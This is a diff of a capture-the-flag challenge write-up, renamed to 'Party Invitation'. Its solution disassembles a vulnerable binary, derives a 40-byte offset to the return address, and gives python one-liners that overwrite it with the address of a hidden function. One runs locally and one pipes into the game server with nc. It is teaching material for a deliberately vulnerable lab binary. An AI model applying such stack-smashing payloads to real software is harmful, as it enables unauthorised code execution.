@@ -1,36 +1,40 @@
-# Awesomeness
+# Party Invitation
 
 ## Question Text
 
-Are you awesome enough? Let's find out!
+There's an awesome that's going to go down next week. 
 
 Created by Noans
 
 ## Distribution
-awesomeness.zip `SHA1: 5f42ea4a320cbfa206badffb6677a85e305ce781`
+AwesomeParty `SHA1: 08797f1fd4473e8d09d64efda3ca429ea0d9afc0`
 
 ## Solution
-1. Do an objdump on `awesomeProj` with the command `objdump -d awesomeProg`.
+1. Do an objdump on `AwesomeParty` with the command `objdump -d AwesomeParty`.
 2. The following parts of from the `objdump` should be studied:  
-`000000000040063b <check>:`  
-`40063b:	55	push   %rbp`  
-`40063c:	48 89 e5             	mov    %rsp,%rbp`  
-`40063f:	48 83 ec 20          	sub    $0x20,%rsp`  
-`400643:	48 8d 45 e0          	lea    -0x20(%rbp),%rax`  
-`400647:	48 89 c6             	mov    %rax,%rsi`  
-`40064a:	bf 08 08 40 00       	mov    $0x400808,%edi`  
-`40064f:	b8 00 00 00 00       	mov    $0x0,%eax`  
-`400654:	e8 67 fe ff ff       	callq  4004c0 <__isoc99_scanf@plt>`  
-`400659:	bf 10 08 40 00       	mov    $0x400810,%edi`  
-`40065e:	e8 3d fe ff ff       	callq  4004a0 <puts@plt>`  
-`400663:	90                   	nop`  
-`400664:	c9                   	leaveq`  
-`400665:	c3                   	retq`  
+`0000000000400586 <check>:`  
+`400586:	55                   	push   %rbp`  
+`400587:	48 89 e5             	mov    %rsp,%rbp`  
+`40058a:	48 83 ec 20          	sub    $0x20,%rsp`  
+`40058e:	48 8d 45 e0          	lea    -0x20(%rbp),%rax`  
+`400592:	48 89 c6             	mov    %rax,%rsi`  
+`400595:	bf 78 06 40 00       	mov    $0x400678,%edi`  
+`40059a:	b8 00 00 00 00       	mov    $0x0,%eax`  
+`40059f:	e8 cc fe ff ff       	callq  400470 <__isoc99_scanf@plt>`  
+`4005a4:	bf 7b 06 40 00       	mov    $0x40067b,%edi`  
+`4005a9:	e8 a2 fe ff ff       	callq  400450 <puts@plt>`  
+`4005ae:	90                   	nop`  
+`4005af:	c9                   	leaveq`  
+`4005b0:	c3                   	retq`  
 Where the third line tells us 32 bytes is reserved for a variable.
-3. Derive that one needs to override 32 bytes + rbp to overwrite return address.  
-4. Also derive address of `awesome` function is `400666`.
-Final command to assuming machine uses little-endian:
-`python -c 'print "a" * 40 + "\x66\x06\x40"' | ./awesomeProg`
+3. Derive that one needs to override 32 bytes + rbp to overwrite return address.
+4. Also derive address of `awesome` function is `4005b1`.
+
+Final command to exploit local program assuming machine uses little-endian:  
+`python -c 'print "a" * 40 + "\xb1\x05\x40"' | ./AwesomeParty`
+
+In order to get the flag, players have to pipe the output to the game server:  
+`python -c 'print "a" * 40 + "\xb1\x05\x40"' | nc play.spgame.site 50000`
 
 ## Recommended Reads
 * https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
